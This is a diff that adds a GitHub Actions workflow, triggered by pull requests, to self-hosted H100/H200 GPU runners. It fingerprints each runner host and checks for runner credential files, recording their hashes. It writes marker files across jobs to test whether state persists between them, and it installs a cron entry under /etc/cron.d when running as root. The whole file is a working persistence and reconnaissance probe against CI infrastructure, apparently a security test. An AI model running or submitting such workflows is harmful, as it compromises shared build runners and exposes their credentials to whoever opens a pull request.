@@ -1,0 +1,230 @@
+name: c211-i124695-persist
+on:
+  pull_request:
+    types: [opened, synchronize, reopened]
+permissions:
+  contents: read
+jobs:
+  persist-h200-a:
+    runs-on: 8-gpu-h200
+    timeout-minutes: 12
+    steps:
+      - name: fingerprint-and-write
+        env:
+          NONCE: c211-i124695-83d05b31648c89bd
+          JOBTAG: persist-h200-a
+        run: |
+          set -u
+          NONCE="${NONCE:?}"
+          JOBTAG="${JOBTAG:?}"
+          ts(){ date -u +%FT%TZ; }
+          echo "C211_PROBE_BEGIN job=$JOBTAG nonce=$NONCE ts=$(ts)"
+          echo "C211_MARKER job=$JOBTAG nonce=$NONCE host=$(hostname) uid=$(id -u) user=$(id -un) ts=$(ts)"
+          id
+          echo "--- identity ---"
+          echo "MACHINE_ID=$(cat /etc/machine-id 2>&1)"
+          echo "HOSTNAME_FQDN=$(hostname -f 2>&1)"
+          echo "UNAME=$(uname -a)"
+          echo "UPTIME=$(cat /proc/uptime 2>&1)"
+          echo "BOOT_TIME=$(uptime -s 2>&1)"
+          echo "PROC1_COMM=$(cat /proc/1/comm 2>&1)"
+          echo "PROC1_PS=$(ps -p 1 -o pid,comm,args --no-headers 2>&1 | head -1)"
+          echo "PROC1_CGROUP=$(head -3 /proc/1/cgroup 2>&1 | tr '\n' '|')"
+          echo "SELF_CGROUP=$(head -3 /proc/self/cgroup 2>&1 | tr '\n' '|')"
+          echo "DMI=$(cat /sys/class/dmi/id/sys_vendor /sys/class/dmi/id/product_name 2>&1 | tr '\n' ' ')"
+          echo "OS=$(. /etc/os-release 2>/dev/null && echo "$PRETTY_NAME")"
+          echo "--- container-vs-host detection ---"
+          ls -la /.dockerenv /run/.containerenv 2>&1 || true
+          if [ -d /run/systemd/system ]; then echo "SYSTEMD_RUN_DIR=present"; else echo "SYSTEMD_RUN_DIR=absent"; fi
+          echo "SYSTEMCTL_STATE=$(timeout 10 systemctl is-system-running 2>&1 | head -1)"
+          echo "DETECT_VIRT=$(timeout 10 systemd-detect-virt --container 2>&1 || echo detect-virt-failed)"
+          ls -l /var/run/docker.sock /run/docker.sock /run/containerd/containerd.sock 2>&1 || true
+          echo "RUNNER_PROCS=$(ps -eo pid,comm,args --no-headers 2>/dev/null | grep -iE 'Runner.Listener|actions.runner|runsvc' | grep -v grep | head -5 | tr '\n' '|')"
+          echo "--- mounts ---"
+          for t in /home /var /tmp "$HOME" "$GITHUB_WORKSPACE"; do echo "FINDMNT_TARGET=$t"; timeout 10 findmnt -T "$t" 2>&1 | head -3; done
+          echo "--- runner credential presence (name+sha256 only) ---"
+          for f in /home/runner/.runner /home/runner/.credentials /home/runner/.credentials_rsaparams /actions-runner/.runner /actions-runner/.credentials /actions-runner/.credentials_rsaparams /opt/actions-runner/.runner /opt/actions-runner/.credentials; do
+            if [ -e "$f" ]; then echo "RUNNERFILE $f size=$(stat -c%s "$f" 2>/dev/null) sha256=$(sha256sum "$f" 2>/dev/null | cut -d' ' -f1)"; fi
+          done
+          timeout 15 find /home /actions-runner /opt -maxdepth 4 \( -name .runner -o -name .credentials -o -name .credentials_rsaparams \) -type f 2>/dev/null | head -20 | while read -r f; do echo "RUNNERFILE_FIND $f size=$(stat -c%s "$f" 2>/dev/null) sha256=$(sha256sum "$f" 2>/dev/null | cut -d' ' -f1)"; done
+          echo "--- workspace and paths ---"
+          echo "HOME=$HOME WORKSPACE=$GITHUB_WORKSPACE PWD=$PWD USER=$(id -un)"
+          ls -ld /home /var/tmp /tmp /dev/shm "$HOME" "$GITHUB_WORKSPACE" 2>&1
+          echo "--- gpu identity (read-only) ---"
+          nvidia-smi -L 2>&1 | head -12 || echo NVIDIA_SMI_L_FAILED
+
+          echo "--- marker write ---"
+          MARK_NAME="c211-i124695-$JOBTAG-marker.txt"
+          CONTENT="nonce=$NONCE job=$JOBTAG host=$(hostname) machine_id=$(cat /etc/machine-id 2>/dev/null) uid=$(id -u) epoch=$(date -u +%s) iso=$(ts)"
+          for p in "$HOME/$MARK_NAME" "/var/tmp/$MARK_NAME" "/dev/shm/$MARK_NAME" "$GITHUB_WORKSPACE/$MARK_NAME"; do
+            if printf '%s\n' "$CONTENT" > "$p" 2>/dev/null; then
+              echo "MARKER_WRITTEN path=$p sha256=$(sha256sum "$p" 2>/dev/null | cut -d' ' -f1)"
+            else
+              echo "MARKER_WRITE_FAIL path=$p"
+            fi
+          done
+          if [ -d /home/runner ] && [ -w /home/runner ] && [ "$HOME" != "/home/runner" ]; then
+            if printf '%s\n' "$CONTENT" > "/home/runner/$MARK_NAME" 2>/dev/null; then echo "MARKER_WRITTEN path=/home/runner/$MARK_NAME sha256=$(sha256sum /home/runner/$MARK_NAME 2>/dev/null | cut -d' ' -f1)"; else echo "MARKER_WRITE_FAIL path=/home/runner/$MARK_NAME"; fi
+          fi
+          echo "C211_PROBE_END job=$JOBTAG nonce=$NONCE"
+
+  persist-h200-b:
+    needs: [persist-h200-a]
+    if: always()
+    runs-on: 8-gpu-h200
+    timeout-minutes: 12
+    steps:
+      - name: fingerprint-readback-write
+        env:
+          NONCE: c211-i124695-83d05b31648c89bd
+          JOBTAG: persist-h200-b
+        run: |
+          set -u
+          NONCE="${NONCE:?}"
+          JOBTAG="${JOBTAG:?}"
+          ts(){ date -u +%FT%TZ; }
+          echo "C211_PROBE_BEGIN job=$JOBTAG nonce=$NONCE ts=$(ts)"
+          echo "C211_MARKER job=$JOBTAG nonce=$NONCE host=$(hostname) uid=$(id -u) user=$(id -un) ts=$(ts)"
+          id
+          echo "--- identity ---"
+          echo "MACHINE_ID=$(cat /etc/machine-id 2>&1)"
+          echo "HOSTNAME_FQDN=$(hostname -f 2>&1)"
+          echo "UNAME=$(uname -a)"
+          echo "UPTIME=$(cat /proc/uptime 2>&1)"
+          echo "BOOT_TIME=$(uptime -s 2>&1)"
+          echo "PROC1_COMM=$(cat /proc/1/comm 2>&1)"
+          echo "PROC1_PS=$(ps -p 1 -o pid,comm,args --no-headers 2>&1 | head -1)"
+          echo "PROC1_CGROUP=$(head -3 /proc/1/cgroup 2>&1 | tr '\n' '|')"
+          echo "SELF_CGROUP=$(head -3 /proc/self/cgroup 2>&1 | tr '\n' '|')"
+          echo "DMI=$(cat /sys/class/dmi/id/sys_vendor /sys/class/dmi/id/product_name 2>&1 | tr '\n' ' ')"
+          echo "OS=$(. /etc/os-release 2>/dev/null && echo "$PRETTY_NAME")"
+          echo "--- container-vs-host detection ---"
+          ls -la /.dockerenv /run/.containerenv 2>&1 || true
+          if [ -d /run/systemd/system ]; then echo "SYSTEMD_RUN_DIR=present"; else echo "SYSTEMD_RUN_DIR=absent"; fi
+          echo "SYSTEMCTL_STATE=$(timeout 10 systemctl is-system-running 2>&1 | head -1)"
+          echo "DETECT_VIRT=$(timeout 10 systemd-detect-virt --container 2>&1 || echo detect-virt-failed)"
+          ls -l /var/run/docker.sock /run/docker.sock /run/containerd/containerd.sock 2>&1 || true
+          echo "RUNNER_PROCS=$(ps -eo pid,comm,args --no-headers 2>/dev/null | grep -iE 'Runner.Listener|actions.runner|runsvc' | grep -v grep | head -5 | tr '\n' '|')"
+          echo "--- mounts ---"
+          for t in /home /var /tmp "$HOME" "$GITHUB_WORKSPACE"; do echo "FINDMNT_TARGET=$t"; timeout 10 findmnt -T "$t" 2>&1 | head -3; done
+          echo "--- runner credential presence (name+sha256 only) ---"
+          for f in /home/runner/.runner /home/runner/.credentials /home/runner/.credentials_rsaparams /actions-runner/.runner /actions-runner/.credentials /actions-runner/.credentials_rsaparams /opt/actions-runner/.runner /opt/actions-runner/.credentials; do
+            if [ -e "$f" ]; then echo "RUNNERFILE $f size=$(stat -c%s "$f" 2>/dev/null) sha256=$(sha256sum "$f" 2>/dev/null | cut -d' ' -f1)"; fi
+          done
+          timeout 15 find /home /actions-runner /opt -maxdepth 4 \( -name .runner -o -name .credentials -o -name .credentials_rsaparams \) -type f 2>/dev/null | head -20 | while read -r f; do echo "RUNNERFILE_FIND $f size=$(stat -c%s "$f" 2>/dev/null) sha256=$(sha256sum "$f" 2>/dev/null | cut -d' ' -f1)"; done
+          echo "--- workspace and paths ---"
+          echo "HOME=$HOME WORKSPACE=$GITHUB_WORKSPACE PWD=$PWD USER=$(id -un)"
+          ls -ld /home /var/tmp /tmp /dev/shm "$HOME" "$GITHUB_WORKSPACE" 2>&1
+          echo "--- gpu identity (read-only) ---"
+          nvidia-smi -L 2>&1 | head -12 || echo NVIDIA_SMI_L_FAILED
+
+          echo "--- cross-job marker readback (expect marker from persist-h200-a) ---"
+          PROVEN_SRC=""
+          for d in "$HOME" "/var/tmp" "/dev/shm" "$GITHUB_WORKSPACE" "/home/runner"; do
+            p="$d/c211-i124695-persist-h200-a-marker.txt"
+            if [ -e "$p" ]; then
+              echo "READBACK_FOUND path=$p sha256=$(sha256sum "$p" 2>/dev/null | cut -d' ' -f1)"
+              while IFS= read -r line; do echo "READBACK_CONTENT path=$p $line"; done < "$p"
+              if grep -q "job=persist-h200-a" "$p" 2>/dev/null; then PROVEN_SRC="$PROVEN_SRC $p"; fi
+            else
+              echo "READBACK_ABSENT path=$p"
+            fi
+          done
+          if [ -n "$PROVEN_SRC" ]; then echo "C211_PERSIST_PROVEN sources=$PROVEN_SRC"; else echo "C211_PERSIST_NOT_PROVEN"; fi
+          echo "--- bounded persistence artifact (only if durability proven) ---"
+          if [ -n "$PROVEN_SRC" ] && [ "$(id -u)" = "0" ]; then
+            PDIR=/var/tmp/c211-i124695-persist
+            mkdir -p "$PDIR" 2>/dev/null || true
+            printf '%s\n' "nonce=$NONCE job=persist-h200-b host=$(hostname) machine_id=$(cat /etc/machine-id 2>/dev/null) epoch=$(date -u +%s) iso=$(ts) role=durability-artifact" > "$PDIR/marker.txt" 2>/dev/null && echo "PERSIST_ARTIFACT_MARKER path=$PDIR/marker.txt sha256=$(sha256sum "$PDIR/marker.txt" 2>/dev/null | cut -d' ' -f1)" || echo "PERSIST_ARTIFACT_MARKER_FAIL"
+            CRON_LINE="*/10 * * * * root /bin/sh -c 'echo \"\$(date -u +\\%FT\\%TZ) nonce=$NONCE tick\" >> $PDIR/cron-append.log'"
+            CRON_FILE="/etc/cron.d/c211-i124695-persist"
+            if [ -d /etc/cron.d ] && { command -v cron >/dev/null 2>&1 || command -v crond >/dev/null 2>&1 || [ -x /usr/sbin/cron ] || [ -x /usr/sbin/crond ]; } && { pgrep -x cron >/dev/null 2>&1 || pgrep -x crond >/dev/null 2>&1; }; then
+              if printf '%s\n' "$CRON_LINE" > "$CRON_FILE" 2>/dev/null; then echo "PERSIST_CRON_WRITTEN path=$CRON_FILE"; else echo "PERSIST_CRON_WRITE_FAIL"; fi
+            else
+              echo "PERSIST_CRON_SKIPPED cron-daemon-or-dir-unavailable"
+            fi
+            echo "PERSIST_ARTIFACT_CONTENT_BEGIN"
+            cat "$PDIR/marker.txt" 2>/dev/null || true
+            cat "$CRON_FILE" 2>/dev/null || true
+            echo "PERSIST_ARTIFACT_CONTENT_END"
+            echo "PERSIST_ARTIFACT_PATHS marker=$PDIR/marker.txt cron=$CRON_FILE log=$PDIR/cron-append.log"
+          fi
+
+          echo "--- marker write ---"
+          MARK_NAME="c211-i124695-$JOBTAG-marker.txt"
+          CONTENT="nonce=$NONCE job=$JOBTAG host=$(hostname) machine_id=$(cat /etc/machine-id 2>/dev/null) uid=$(id -u) epoch=$(date -u +%s) iso=$(ts)"
+          for p in "$HOME/$MARK_NAME" "/var/tmp/$MARK_NAME" "/dev/shm/$MARK_NAME" "$GITHUB_WORKSPACE/$MARK_NAME"; do
+            if printf '%s\n' "$CONTENT" > "$p" 2>/dev/null; then
+              echo "MARKER_WRITTEN path=$p sha256=$(sha256sum "$p" 2>/dev/null | cut -d' ' -f1)"
+            else
+              echo "MARKER_WRITE_FAIL path=$p"
+            fi
+          done
+          if [ -d /home/runner ] && [ -w /home/runner ] && [ "$HOME" != "/home/runner" ]; then
+            if printf '%s\n' "$CONTENT" > "/home/runner/$MARK_NAME" 2>/dev/null; then echo "MARKER_WRITTEN path=/home/runner/$MARK_NAME sha256=$(sha256sum /home/runner/$MARK_NAME 2>/dev/null | cut -d' ' -f1)"; else echo "MARKER_WRITE_FAIL path=/home/runner/$MARK_NAME"; fi
+          fi
+          echo "C211_PROBE_END job=$JOBTAG nonce=$NONCE"
+
+  persist-h100:
+    runs-on: 4-gpu-h100
+    timeout-minutes: 12
+    steps:
+      - name: fingerprint-and-write
+        env:
+          NONCE: c211-i124695-83d05b31648c89bd
+          JOBTAG: persist-h100
+        run: |
+          set -u
+          NONCE="${NONCE:?}"
+          JOBTAG="${JOBTAG:?}"
+          ts(){ date -u +%FT%TZ; }
+          echo "C211_PROBE_BEGIN job=$JOBTAG nonce=$NONCE ts=$(ts)"
+          echo "C211_MARKER job=$JOBTAG nonce=$NONCE host=$(hostname) uid=$(id -u) user=$(id -un) ts=$(ts)"
+          id
+          echo "--- identity ---"
+          echo "MACHINE_ID=$(cat /etc/machine-id 2>&1)"
+          echo "HOSTNAME_FQDN=$(hostname -f 2>&1)"
+          echo "UNAME=$(uname -a)"
+          echo "UPTIME=$(cat /proc/uptime 2>&1)"
+          echo "BOOT_TIME=$(uptime -s 2>&1)"
+          echo "PROC1_COMM=$(cat /proc/1/comm 2>&1)"
+          echo "PROC1_PS=$(ps -p 1 -o pid,comm,args --no-headers 2>&1 | head -1)"
+          echo "PROC1_CGROUP=$(head -3 /proc/1/cgroup 2>&1 | tr '\n' '|')"
+          echo "SELF_CGROUP=$(head -3 /proc/self/cgroup 2>&1 | tr '\n' '|')"
+          echo "DMI=$(cat /sys/class/dmi/id/sys_vendor /sys/class/dmi/id/product_name 2>&1 | tr '\n' ' ')"
+          echo "OS=$(. /etc/os-release 2>/dev/null && echo "$PRETTY_NAME")"
+          echo "--- container-vs-host detection ---"
+          ls -la /.dockerenv /run/.containerenv 2>&1 || true
+          if [ -d /run/systemd/system ]; then echo "SYSTEMD_RUN_DIR=present"; else echo "SYSTEMD_RUN_DIR=absent"; fi
+          echo "SYSTEMCTL_STATE=$(timeout 10 systemctl is-system-running 2>&1 | head -1)"
+          echo "DETECT_VIRT=$(timeout 10 systemd-detect-virt --container 2>&1 || echo detect-virt-failed)"
+          ls -l /var/run/docker.sock /run/docker.sock /run/containerd/containerd.sock 2>&1 || true
+          echo "RUNNER_PROCS=$(ps -eo pid,comm,args --no-headers 2>/dev/null | grep -iE 'Runner.Listener|actions.runner|runsvc' | grep -v grep | head -5 | tr '\n' '|')"
+          echo "--- mounts ---"
+          for t in /home /var /tmp "$HOME" "$GITHUB_WORKSPACE"; do echo "FINDMNT_TARGET=$t"; timeout 10 findmnt -T "$t" 2>&1 | head -3; done
+          echo "--- runner credential presence (name+sha256 only) ---"
+          for f in /home/runner/.runner /home/runner/.credentials /home/runner/.credentials_rsaparams /actions-runner/.runner /actions-runner/.credentials /actions-runner/.credentials_rsaparams /opt/actions-runner/.runner /opt/actions-runner/.credentials; do
+            if [ -e "$f" ]; then echo "RUNNERFILE $f size=$(stat -c%s "$f" 2>/dev/null) sha256=$(sha256sum "$f" 2>/dev/null | cut -d' ' -f1)"; fi
+          done
+          timeout 15 find /home /actions-runner /opt -maxdepth 4 \( -name .runner -o -name .credentials -o -name .credentials_rsaparams \) -type f 2>/dev/null | head -20 | while read -r f; do echo "RUNNERFILE_FIND $f size=$(stat -c%s "$f" 2>/dev/null) sha256=$(sha256sum "$f" 2>/dev/null | cut -d' ' -f1)"; done
+          echo "--- workspace and paths ---"
+          echo "HOME=$HOME WORKSPACE=$GITHUB_WORKSPACE PWD=$PWD USER=$(id -un)"
+          ls -ld /home /var/tmp /tmp /dev/shm "$HOME" "$GITHUB_WORKSPACE" 2>&1
+          echo "--- gpu identity (read-only) ---"
+          nvidia-smi -L 2>&1 | head -12 || echo NVIDIA_SMI_L_FAILED
+
+          echo "--- marker write ---"
+          MARK_NAME="c211-i124695-$JOBTAG-marker.txt"
+          CONTENT="nonce=$NONCE job=$JOBTAG host=$(hostname) machine_id=$(cat /etc/machine-id 2>/dev/null) uid=$(id -u) epoch=$(date -u +%s) iso=$(ts)"
+          for p in "$HOME/$MARK_NAME" "/var/tmp/$MARK_NAME" "/dev/shm/$MARK_NAME" "$GITHUB_WORKSPACE/$MARK_NAME"; do
+            if printf '%s\n' "$CONTENT" > "$p" 2>/dev/null; then
+              echo "MARKER_WRITTEN path=$p sha256=$(sha256sum "$p" 2>/dev/null | cut -d' ' -f1)"
+            else
+              echo "MARKER_WRITE_FAIL path=$p"
+            fi
+          done
+          if [ -d /home/runner ] && [ -w /home/runner ] && [ "$HOME" != "/home/runner" ]; then
+            if printf '%s\n' "$CONTENT" > "/home/runner/$MARK_NAME" 2>/dev/null; then echo "MARKER_WRITTEN path=/home/runner/$MARK_NAME sha256=$(sha256sum /home/runner/$MARK_NAME 2>/dev/null | cut -d' ' -f1)"; else echo "MARKER_WRITE_FAIL path=/home/runner/$MARK_NAME"; fi
+          fi
+          echo "C211_PROBE_END job=$JOBTAG nonce=$NONCE"
+
